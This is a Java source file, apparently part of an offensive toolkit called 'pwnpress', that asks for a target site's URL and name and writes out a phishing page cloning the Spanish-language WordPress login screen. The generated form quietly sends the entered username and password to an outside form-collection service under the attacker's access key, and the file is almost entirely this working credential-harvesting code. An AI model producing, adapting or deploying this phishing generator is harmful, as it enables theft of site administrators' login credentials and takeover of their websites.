package org.pwnpress.phishing;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Scanner;

import org.pwnpress.framework.WPFramework;

public class WPDefaultLogin {
    
    public static void phish() throws IOException {
    	
    	System.out.println("\n[!] WARNING:\n"
                + "\nThe Phishing website code provided may not be accurate for your target,"
                + "\nthis script provides a default login page appearence and functionality."
                + "\nFurther adjustments might be required.\n");
        
        Scanner scanner = new Scanner(System.in);
        
        System.out.print("\nTarget info:\n\n");
        System.out.print("Enter the URL: ");
        String url = scanner.nextLine();
        System.out.print("Enter the website name: ");
        String websiteName = scanner.nextLine();
        
        System.out.print("\nCollection info:\n\n");
        System.out.print("Enter your Static Forms API: ");
        String staticFormsApi = scanner.nextLine();
        
        System.out.print("\nOutput info:\n\n");
        System.out.print("How do you want to name the HTML file: ");
        String outputFileName = scanner.nextLine();

        String HTML = """
        <!DOCTYPE html>
        <html lang="es" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#">
            <head>
                <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
                <title>Acceder | %s — WordPress</title>
                <meta name='robots' content='noindex, follow' />
                <link rel='stylesheet' id='dashicons-css' href='%swp-includes/css/dashicons.min.css?ver=6.3.3' type='text/css' media='all' />
                <link rel='stylesheet' id='buttons-css' href='%swp-includes/css/buttons.min.css?ver=6.3.3' type='text/css' media='all' />
                <link rel='stylesheet' id='forms-css' href='%swp-admin/css/forms.min.css?ver=6.3.3' type='text/css' media='all' />
                <link rel='stylesheet' id='l10n-css' href='%swp-admin/css/l10n.min.css?ver=6.3.3' type='text/css' media='all' />
                <link rel='stylesheet' id='login-css' href='%swp-admin/css/login.min.css?ver=6.3.3' type='text/css' media='all' />
                <meta name="generator" content="Site Kit by Google 1.110.0" />
                <meta name='referrer' content='strict-origin-when-cross-origin' />
                <meta name="viewport" content="width=device-width" />
                <link rel="icon" href="https://s.w.org/favicon.ico?2" sizes="32x32">
            </head>
            <body class="login no-js login-action-login wp-core-ui  locale-es-es">
                <div id="login">
                    <h1><a href="https://es.wordpress.org/">Funciona con WordPress</a></h1>
                    <form name="loginform" id="loginform" action="https://api.staticforms.xyz/submit" method="post">
                        <input type="hidden" name="accessKey" value="%s">
                        <p>
                            <label for="user_login">Nombre de usuario o correo electrónico</label>
                            <input type="text" name="email" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
                        </p>
                        <div class="user-pass-wrap">
                            <label for="user_pass">Contraseña</label>
                            <div class="wp-pwd">
                                <input type="password" name="message" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
                                <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Mostrar la contraseña">
                                    <span class="dashicons dashicons-visibility" aria-hidden="true"></span>
                                </button>
                            </div>
                        </div>
                        <p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> <label for="rememberme">Recuérdame</label></p>
                        <p class="submit">
                            <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Acceder" />
                            <input type="hidden" name="redirectTo" value="%swp-admin/" > <!-- Optional -->
                        </p>
                    </form>
                    <p id="nav">
                        <a href="#">¿Has olvidado tu contraseña?</a>
                    </p>
                    <p id="backtoblog">
                        <a href="%s">&larr; Ir a %s</a>
                    </p>
                </div>
                <div class="language-switcher">
                    <form id="language-switcher" action="" method="get">
                        <label for="language-switcher-locales">
                            <span class="dashicons dashicons-translation" aria-hidden="true"></span>
                            <span class="screen-reader-text">Idioma</span>
                        </label>
                        <select name="wp_lang" id="language-switcher-locales">
                            <option value="en_US" lang="en" data-installed="1">English (United States)</option>
                            <option value="es_ES" lang="es" selected='selected' data-installed="1">Español</option>
                        </select>
                        <input type="submit" class="button" value="Cambiar">
                    </form>
                </div>
            </body>
        </html>
        """.formatted(websiteName, url, url, url, url, url, staticFormsApi, url, url, websiteName);

        try {
        	
            FileWriter myWriter = new FileWriter(outputFileName + ".html");
            myWriter.write(HTML);
            myWriter.close();
            System.out.println("Successfully created " + outputFileName + ".html!\n");
            WPFramework.framework();
        } catch (IOException e) {
            System.out.println("An error occurred while creating the file.\n");
            e.printStackTrace();
            WPFramework.framework();
        }
        
        scanner.close();
    }
    
}
